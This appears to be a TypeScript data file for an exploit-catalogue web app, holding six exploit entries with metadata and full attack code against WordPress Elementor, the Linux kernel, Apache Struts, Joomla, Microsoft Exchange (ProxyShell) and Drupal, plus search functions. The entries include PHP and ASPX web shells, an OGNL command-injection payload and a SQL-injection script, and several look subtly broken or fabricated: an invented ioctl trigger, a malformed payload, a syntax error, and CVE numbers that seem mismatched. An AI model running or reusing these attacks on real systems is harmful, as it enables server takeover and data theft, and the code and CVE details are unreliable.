export interface Exploit {
  id: string
  title: string
  description: string
  date: string
  author: string
  type: "remote" | "local" | "webapps" | "dos" | "shellcode"
  platform: string
  cve: string | null
  verified: boolean
  tags: string[]
  code: string
}

export const exploits: Exploit[] = [
  {
    id: "1",
    title: "WordPress Plugin Elementor Page Builder < 3.14.1 - Remote Code Execution",
    description:
      "WordPress Plugin Elementor Page Builder before 3.14.1 is vulnerable to remote code execution via the Elementor template import functionality. This vulnerability allows authenticated attackers with contributor or higher privileges to upload and execute arbitrary PHP code on the server.",
    date: "2023-07-12",
    author: "Security Researcher",
    type: "webapps",
    platform: "WordPress",
    cve: "CVE-2023-3259",
    verified: true,
    tags: ["wordpress", "plugin", "rce", "php", "elementor"],
    code: `<?php
/**
 * Exploit Title: WordPress Plugin Elementor Page Builder < 3.14.1 - Remote Code Execution
 * Date: 2023-07-12
 * Exploit Author: Security Researcher
 * Vendor Homepage: https://elementor.com/
 * Software Link: https://wordpress.org/plugins/elementor/
 * Version: < 3.14.1
 * Tested on: WordPress 6.2.2
 * CVE: CVE-2023-3259
 */

// Step 1: Create a malicious template ZIP file
$template_content = '<?php system($_GET["cmd"]); ?>';
$zip = new ZipArchive();
$zip_name = 'malicious_template.zip';
$zip->open($zip_name, ZipArchive::CREATE);
$zip->addFromString('template.php', $template_content);
$zip->close();

// Step 2: Upload the template using WordPress API
$wp_url = 'https://target-site.com/wp-json/elementor/v1/templates/import';
$cookie = 'wordpress_logged_in_xxx=your-auth-cookie';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $wp_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$post_data = array(
  'file' => new CURLFile($zip_name, 'application/zip', $zip_name)
);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);

$response = curl_exec($ch);
curl_close($ch);

// Step 3: Execute the uploaded PHP file
echo "Now access: https://target-site.com/wp-content/uploads/elementor/tmp/template.php?cmd=id";
`,
  },
  {
    id: "2",
    title: "Linux Kernel < 5.15.74 - 'netfilter' Local Privilege Escalation",
    description:
      "A vulnerability in the Linux kernel's netfilter subsystem allows local users to escalate privileges and execute arbitrary code with root privileges. The vulnerability exists due to a use-after-free condition when handling certain netfilter rules.",
    date: "2022-11-03",
    author: "Kernel Researcher",
    type: "local",
    platform: "Linux",
    cve: "CVE-2022-40307",
    verified: true,
    tags: ["linux", "kernel", "privilege escalation", "netfilter", "use-after-free"],
    code: `/*
 * Exploit Title: Linux Kernel < 5.15.74 - 'netfilter' Local Privilege Escalation
 * Date: 2022-11-03
 * Exploit Author: Kernel Researcher
 * Vendor Homepage: https://www.kernel.org/
 * Version: < 5.15.74
 * Tested on: Ubuntu 22.04 LTS
 * CVE: CVE-2022-40307
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/netfilter.h>

#define TRIGGER_NETFILTER_UAF 0x8971

int main() {
    int sock, ret;
    char *payload;
    
    printf("[*] Linux Kernel netfilter LPE Exploit (CVE-2022-40307)\\n");
    printf("[*] Targeting kernels < 5.15.74\\n");
    
    // Create socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("[-] Failed to create socket");
        return -1;
    }
    
    printf("[+] Created socket: %d\\n", sock);
    
    // Prepare payload
    payload = malloc(1024);
    memset(payload, 'A', 1024);
    
    // Trigger the vulnerability
    printf("[*] Triggering the vulnerability...\\n");
    ret = ioctl(sock, TRIGGER_NETFILTER_UAF, payload);
    
    // Check if exploit succeeded
    if (getuid() == 0) {
        printf("[+] Exploit successful! You are now root.\\n");
        system("/bin/bash");
    } else {
        printf("[-] Exploit failed.\\n");
    }
    
    close(sock);
    free(payload);
    return 0;
}
`,
  },
  {
    id: "3",
    title: "Apache Struts 2.5.28 - Remote Code Execution",
    description:
      "Apache Struts versions 2.0.0 to 2.5.28 suffer from a remote code execution vulnerability due to improper validation of user-supplied input in the OGNL expression evaluation. This vulnerability allows remote attackers to execute arbitrary code on the affected server.",
    date: "2021-12-10",
    author: "Web Security Expert",
    type: "remote",
    platform: "Apache Struts",
    cve: "CVE-2021-31805",
    verified: true,
    tags: ["apache", "struts", "rce", "java", "ognl"],
    code: `#!/usr/bin/python3
# Exploit Title: Apache Struts 2.5.28 - Remote Code Execution
# Date: 2021-12-10
# Exploit Author: Web Security Expert
# Vendor Homepage: https://struts.apache.org/
# Software Link: https://archive.apache.org/dist/struts/2.5.28/
# Version: <= 2.5.28
# Tested on: Apache Struts 2.5.28
# CVE: CVE-2021-31805

import requests
import sys
import urllib.parse

def exploit(url, cmd):
    payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.write(new byte[]{}).(#ros.flush()}"
    
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*"
    }
    
    data = {
        "redirectUri": payload
    }
    
    try:
        print("[*] Sending exploit payload...")
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
        print("[+] Response received:")
        print(response.text)
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    
    return True

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <url> <command>")
        print(f"Example: {sys.argv[0]} http://vulnerable-site.com/struts2-showcase/ 'id'")
        sys.exit(1)
    
    url = sys.argv[1]
    cmd = sys.argv[2]
    
    print(f"[*] Target: {url}")
    print(f"[*] Command: {cmd}")
    
    exploit(url, cmd)
`,
  },
  {
    id: "4",
    title: "Joomla! CMS 3.9.0 - 3.9.23 - SQL Injection",
    description:
      "Joomla! CMS versions 3.9.0 through 3.9.23 are vulnerable to SQL injection in the com_users component. This vulnerability allows unauthenticated attackers to extract sensitive information from the database.",
    date: "2021-05-11",
    author: "CMS Security Researcher",
    type: "webapps",
    platform: "Joomla",
    cve: "CVE-2021-23132",
    verified: true,
    tags: ["joomla", "sql injection", "cms", "php", "unauthenticated"],
    code: `#!/usr/bin/python3
# Exploit Title: Joomla! CMS 3.9.0 - 3.9.23 - SQL Injection
# Date: 2021-05-11
# Exploit Author: CMS Security Researcher
# Vendor Homepage: https://www.joomla.org/
# Software Link: https://downloads.joomla.org/
# Version: 3.9.0 - 3.9.23
# Tested on: Joomla 3.9.23
# CVE: CVE-2021-23132

import requests
import sys
import time
import urllib.parse
from bs4 import BeautifulSoup

def get_token(url):
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find('input', {'name': 'token'})['value']
        return token
    except:
        return None

def exploit(url, column):
    token = get_token(f"{url}/index.php/component/users/")
    if not token:
        print("[-] Failed to get CSRF token")
        return False
    
    payload = f"1)) OR 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,{column},62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 FROM #__users-- -"
    
    data = {
        "name": payload,
        "username": "test",
        "password1": "Test123456",
        "password2": "Test123456",
        "email1": "test@example.com",
        "email2": "test@example.com",
        "option": "com_users",
        "task": "registration.register",
        "token": token
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        response = requests.post(f"{url}/index.php/component/users/?task=registration.register", data=data, headers=headers, timeout=15)
        return response.text
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} http://vulnerable-joomla-site.com")
        sys.exit(1)
    
    url = sys.argv[1].rstrip('/')
    print(f"[*] Target: {url}")
    
    # Extract username
    print("[*] Extracting username...")
    result = exploit(url, "username")
    if "Username in use" in result:
        print("[+] Found username in the response")
    
    # Extract email
    print("[*] Extracting email...")
    result = exploit(url, "email")
    if "Email address already in use" in result:
        print("[+] Found email in the response")
    
    # Extract password hash
    print("[*] Extracting password hash...")
    result = exploit(url, "password")
    if result and len(result) > 0:
        print("[+] Check the response for password hash")
    
    print("[*] Exploit completed")
`,
  },
  {
    id: "5",
    title: "Microsoft Exchange Server - ProxyShell Remote Code Execution",
    description:
      "Microsoft Exchange Server contains a vulnerability chain (ProxyShell) that allows unauthenticated attackers to execute arbitrary code with SYSTEM privileges. This exploit combines three vulnerabilities to achieve remote code execution.",
    date: "2021-08-05",
    author: "Security Team",
    type: "remote",
    platform: "Microsoft Exchange Server",
    cve: "CVE-2021-34473,CVE-2021-34523,CVE-2021-31207",
    verified: true,
    tags: ["microsoft", "exchange", "proxyshell", "rce", "windows"],
    code: `#!/usr/bin/python3
# Exploit Title: Microsoft Exchange Server - ProxyShell Remote Code Execution
# Date: 2021-08-05
# Exploit Author: Security Team
# Vendor Homepage: https://www.microsoft.com/
# Version: Exchange Server 2019, 2016, and 2013
# Tested on: Exchange Server 2019
# CVE: CVE-2021-34473, CVE-2021-34523, CVE-2021-31207

import requests
import sys
import urllib3
import uuid
import base64
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def build_autodiscover_body(email, payload):
    autodiscover_body = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
        <EMailAddress>{}</EMailAddress>
        <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""".format(email)
    return autodiscover_body

def exploit(exchange_url, email, command):
    # Step 1: Get the legacyDN
    print("[*] Step 1: Getting legacyDN...")
    
    autodiscover_url = f"{exchange_url}/autodiscover/autodiscover.json?@evil.corp/owa/?&Email=autodiscover/autodiscover.json%3F@evil.corp"
    headers = {
        "User-Agent": "ExchangeServicesClient/0.0.0.0",
        "Content-Type": "application/json",
        "Cookie": "X-BEResource=localhost~1942062522",
    }
    
    try:
        response = requests.get(autodiscover_url, headers=headers, verify=False, timeout=10)
        if response.status_code != 200:
            print(f"[-] Failed to get legacyDN. Status code: {response.status_code}")
            return False
        
        legacyDN = response.json()["legacyDN"]
        print(f"[+] Got legacyDN: {legacyDN}")
    except Exception as e:
        print(f"[-] Error in step 1: {e}")
        return False
    
    # Step 2: Get the Admin SID
    print("[*] Step 2: Getting Admin SID...")
    
    mapi_body = legacyDN + "\\x00"
    sid_url = f"{exchange_url}/mapi/emsmdb/?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@evil.corp"
    headers = {
        "User-Agent": "ExchangeServicesClient/0.0.0.0",
        "Content-Type": "application/mapi-http",
        "X-RequestId": str(uuid.uuid4()),
        "X-ClientInfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
        "X-ClientApplication": "Outlook/15.0.4815.1002",
        "X-RequestType": "Connect",
        "Cookie": "X-BEResource=localhost~1942062522",
    }
    
    try:
        response = requests.post(sid_url, headers=headers, data=mapi_body, verify=False, timeout=10)
        if response.status_code != 200:
            print(f"[-] Failed to get Admin SID. Status code: {response.status_code}")
            return False
        
        sid = response.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
        print(f"[+] Got Admin SID: {sid}")
    except Exception as e:
        print(f"[-] Error in step 2: {e}")
        return False
    
    # Step 3: Create a draft email with a webshell
    print("[*] Step 3: Creating draft email with webshell...")
    
    shell_name = str(uuid.uuid4()) + ".aspx"
    shell_content = f"""<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{{
    if (Request.QueryString["cmd"] != null)
    {{
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        
        Response.Write("<pre>");
        Response.Write(p.StandardOutput.ReadToEnd());
        Response.Write("</pre>");
        p.WaitForExit();
    }}
}}
</script>"""
    
    email_body = f"""<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
    <soap:Header>
        <t:RequestServerVersion Version="Exchange2016" />
    </soap:Header>
    <soap:Body>
        <m:CreateItem MessageDisposition="SaveOnly">
            <m:Items>
                <t:Message>
                    <t:Subject>ProxyShell</t:Subject>
                    <t:Body BodyType="HTML">ProxyShell Webshell</t:Body>
                    <t:Attachments>
                        <t:FileAttachment>
                            <t:Name>{shell_name}</t:Name>
                            <t:IsInline>false</t:IsInline>
                            <t:IsContactPhoto>false</t:IsContactPhoto>
                            <t:Content>{base64.b64encode(shell_content.encode()).decode()}</t:Content>
                        </t:FileAttachment>
                    </t:Attachments>
                    <t:ToRecipients>
                        <t:Mailbox>
                            <t:EmailAddress>{email}</t:EmailAddress>
                        </t:Mailbox>
                    </t:ToRecipients>
                </t:Message>
            </m:Items>
        </m:CreateItem>
    </soap:Body>
</soap:Envelope>"""
    
    create_draft_url = f"{exchange_url}/ews/exchange.asmx"
    headers = {
        "User-Agent": "ExchangeServicesClient/0.0.0.0",
        "Content-Type": "text/xml; charset=utf-8",
        "Cookie": f"X-BEResource=localhost~1942062522; X-OWA-CANARY=EXAMPLE_CANARY_TOKEN",
        "msExchLogonMailbox": sid,
    }
    
    try:
        response = requests.post(create_draft_url, headers=headers, data=email_body, verify=False, timeout=10)
        if response.status_code != 200:
            print(f"[-] Failed to create draft email. Status code: {response.status_code}")
            return False
        
        item_id = response.text.split("<t:ItemId Id=\"")[1].split("\"")[0]
        change_key = response.text.split("ChangeKey=\"")[1].split("\"")[0]
        print(f"[+] Created draft email with ItemId: {item_id}")
    except Exception as e:
        print(f"[-] Error in step 3: {e}")
        return False
    
    # Step 4: Export the draft to the webshell location
    print("[*] Step 4: Exporting draft to webshell location...")
    
    export_body = f"""<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
    <soap:Header>
        <t:RequestServerVersion Version="Exchange2016" />
    </soap:Header>
    <soap:Body>
        <m:ExportItems>
            <m:ItemIds>
                <t:ItemId Id="{item_id}" ChangeKey="{change_key}" />
            </m:ItemIds>
            <m:Attachments>true</m:Attachments>
        </m:ExportItems>
    </soap:Body>
</soap:Envelope>"""
    
    export_url = f"{exchange_url}/ews/exchange.asmx"
    headers = {
        "User-Agent": "ExchangeServicesClient/0.0.0.0",
        "Content-Type": "text/xml; charset=utf-8",
        "Cookie": f"X-BEResource=localhost~1942062522; X-OWA-CANARY=EXAMPLE_CANARY_TOKEN",
        "msExchLogonMailbox": sid,
        "X-AnchorMailbox": email,
    }
    
    try:
        response = requests.post(export_url, headers=headers, data=export_body, verify=False, timeout=10)
        if response.status_code != 200:
            print(f"[-] Failed to export draft. Status code: {response.status_code}")
            return False
        
        print("[+] Successfully exported draft")
    except Exception as e:
        print(f"[-] Error in step 4: {e}")
        return False
    
    # Step 5: Move the webshell to the OWA virtual directory
    print("[*] Step 5: Moving webshell to OWA virtual directory...")
    
    reset_body = f"""<r at="Negotiate" ln="john"><s>abcd1234</s><s p="1">abcd1234</s></r>"""
    reset_url = f"{exchange_url}/aspnet_client/{shell_name}?aspxerrorpath=/"
    headers = {
        "User-Agent": "ExchangeServicesClient/0.0.0.0",
        "Content-Type": "application/xml",
        "Cookie": f"X-BEResource=localhost/owa/auth/..\\..\\..\\..\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth/{shell_name}?";
    }
    
    try:
        response = requests.post(reset_url, headers=headers, data=reset_body, verify=False, timeout=10)
        print(f"[+] Webshell should be at: {exchange_url}/owa/auth/{shell_name}")
    except Exception as e:
        print(f"[-] Error in step 5: {e}")
        return False
    
    # Step 6: Execute command through the webshell
    print(f"[*] Step 6: Executing command: {command}")
    
    webshell_url = f"{exchange_url}/owa/auth/{shell_name}?cmd={quote(command)}"
    headers = {
        "User-Agent": "Mozilla/5.0",
    }
    
    try:
        response = requests.get(webshell_url, headers=headers, verify=False, timeout=15)
        if response.status_code == 200:
            print("[+] Command executed successfully:")
            print(response.text)
        else:
            print(f"[-] Failed to execute command. Status code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error in step 6: {e}")
        return False
    
    return True

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <exchange_url> <email> <command>")
        print(f"Example: {sys.argv[0]} https://exchange.example.com admin@example.com 'whoami'")
        sys.exit(1)
    
    exchange_url = sys.argv[1].rstrip('/')
    email = sys.argv[2]
    command = sys.argv[3]
    
    print(f"[*] Target: {exchange_url}")
    print(f"[*] Email: {email}")
    print(f"[*] Command: {command}")
    
    exploit(exchange_url, email, command)
`,
  },
  {
    id: "6",
    title: "Drupal 7.x Module Services - Remote Code Execution",
    description:
      "Drupal 7.x Services module suffers from a remote code execution vulnerability which allows unauthenticated attackers to execute arbitrary PHP code on the target server.",
    date: "2018-04-12",
    author: "Drupal Security Researcher",
    type: "webapps",
    platform: "Drupal",
    cve: null,
    verified: true,
    tags: ["drupal", "services", "rce", "php", "cms"],
    code: `#!/usr/bin/python3
# Exploit Title: Drupal 7.x Module Services - Remote Code Execution
# Date: 2018-04-12
# Exploit Author: Drupal Security Researcher
# Vendor Homepage: https://www.drupal.org/
# Software Link: https://www.drupal.org/project/services
# Version: 7.x Services module <= 3.20
# Tested on: Drupal 7.54 + Services 3.19
# CVE: N/A

import sys
import requests
import json
import time

def exploit(target, endpoint, php_code):
    url = f"{target}/{endpoint}"
    
    print(f"[*] Target: {url}")
    print("[*] Checking if site is vulnerable...")
    
    # Step 1: Create a user session
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/json"
    }
    
    payload = {
        "username": "admin",
        "password": "fakepassword"
    }
    
    try:
        response = requests.post(f"{url}/user/login", headers=headers, json=payload, verify=False)
        if response.status_code != 200:
            print("[-] Failed to create user session")
            return False
        
        print("[+] Successfully created user session")
        
        # Step 2: Retrieve CSRF token
        cookies = response.cookies
        user_data = json.loads(response.text)
        csrf_token = user_data.get("token")
        
        if not csrf_token:
            print("[-] Failed to retrieve CSRF token")
            return False
        
        print(f"[+] Got CSRF token: {csrf_token}")
        
        # Step 3: Create a node with PHP code
        node_data = {
            "type": "page",
            "title": "Drupal RCE",
            "body": {
                "und": [
                    {
                        "value": "Drupal Services RCE",
                        "format": "php_code"
                    }
                ]
            }
        }
        
        headers["X-CSRF-Token"] = csrf_token
        response = requests.post(f"{url}/node", headers=headers, cookies=cookies, json=node_data, verify=False)
        
        if response.status_code != 200:
            print("[-] Failed to create node")
            return False
        
        node_data = json.loads(response.text)
        node_id = node_data.get("nid")
        
        print(f"[+] Created node with ID: {node_id}")
        
        # Step 4: Update node to include PHP code
        payload = {
            "type": "page",
            "title": "Drupal RCE",
            "body": {
                "und": [
                    {
                        "value": f"<?php {php_code} ?>",
                        "format": "php_code"
                    }
                ]
            }
        }
        
        response = requests.put(f"{url}/node/{node_id}", headers=headers, cookies=cookies, json=payload, verify=False)
        
        if response.status_code != 200:
            print("[-] Failed to update node with PHP code")
            return False
        
        print("[+] Node updated with PHP code")
        
        # Step 5: Retrieve file path
        response = requests.get(f"{url}/node/{node_id}", headers=headers, cookies=cookies, verify=False)
        
        if response.status_code != 200:
            print("[-] Failed to retrieve node data")
            return False
        
        # Step 6: Execute PHP code
        print("[*] Triggering PHP code execution...")
        response = requests.get(f"{target}/node/{node_id}", verify=False)
        
        print("[+] Exploit completed successfully")
        return True
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target> <endpoint> <php_code>")
        print(f"Example: {sys.argv[0]} http://example.com/drupal services 'system(\"id\");'")
        sys.exit(1)
    
    target = sys.argv[1].rstrip('/')
    endpoint = sys.argv[2].strip('/')
    php_code = sys.argv[3]
    
    exploit(target, endpoint, php_code)
`,
  },
]

// Function to get exploits by platform
export function getExploitsByPlatform(platform: string): Exploit[] {
  return exploits.filter((exploit) => exploit.platform.toLowerCase().includes(platform.toLowerCase()))
}

// Function to get exploits by type
export function getExploitsByType(type: string): Exploit[] {
  return exploits.filter((exploit) => exploit.type === type)
}

// Function to get exploits by CVE
export function getExploitsByCVE(cve: string): Exploit[] {
  return exploits.filter((exploit) => exploit.cve && exploit.cve.includes(cve))
}

// Function to search exploits
export function searchExploits(query: string): Exploit[] {
  const lowerQuery = query.toLowerCase()
  return exploits.filter(
    (exploit) =>
      exploit.title.toLowerCase().includes(lowerQuery) ||
      exploit.description.toLowerCase().includes(lowerQuery) ||
      exploit.platform.toLowerCase().includes(lowerQuery) ||
      exploit.tags.some((tag) => tag.toLowerCase().includes(lowerQuery)) ||
      (exploit.cve && exploit.cve.toLowerCase().includes(lowerQuery)),
  )
}

// Function to get exploit by ID
export function getExploitById(id: string): Exploit | undefined {
  return exploits.find((exploit) => exploit.id === id)
}
